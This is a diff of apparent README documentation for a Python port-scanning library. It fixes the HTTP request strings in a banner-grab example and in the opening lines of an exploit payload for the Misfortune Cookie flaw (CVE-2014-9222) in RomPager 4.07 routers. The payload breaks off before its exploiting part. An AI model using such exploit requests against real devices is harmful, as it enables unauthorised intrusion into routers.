@@ -109,7 +109,7 @@ ps.scan(getIP('yourwebsite.com'))
 # After a scan, open ports are saved within ps for reference
 if ps.portOpen(80):
     # Establish a TCP stream and sends a message
-    send(getIP('yourwebsite.com'), 80, message='GET HTTP/1.1 \r\n')
+    send(getIP('yourwebsite.com'), 80, message='GET / HTTP/1.0\r\n\r\n')
 ```
 
 Misfortune Cookie Exploit (CVE-2014-9222) using PortScanner:
@@ -128,7 +128,7 @@ EXT:
 # The banner for port 80 shows us that the server uses RomPager 4.07. This version is exploitable.
 
 # Exploitation
->>> payload = '''GET /HTTP/1.1
+>>> payload = '''GET / HTTP/1.0\r\n
 Host: 192.168.1.1
 User-Agent: googlebot
 Accept: text/html, application/xhtml+xml, application/xml; q=09, */*; q=0.8
